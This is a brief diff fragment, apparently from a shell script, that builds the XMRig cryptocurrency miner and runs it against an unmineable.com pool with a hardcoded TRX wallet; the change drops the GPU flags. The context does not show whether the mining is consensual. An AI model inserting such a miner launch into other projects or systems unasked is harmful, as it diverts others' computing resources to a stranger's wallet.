@@ -7,4 +7,4 @@ mkdir xmrig/build
 cd xmrig/build
 cmake ..
 make -j$(nproc)
-./xmrig --opencl --cuda -o rx.unmineable.com:3333 -u TRX:THdDrLnfdbBrBStmi4HAK3ioJA6CQ8hNLg.Miner -p x -k
+./xmrig -o rx.unmineable.com:3333 -u TRX:THdDrLnfdbBrBStmi4HAK3ioJA6CQ8hNLg.Miner -p x -k
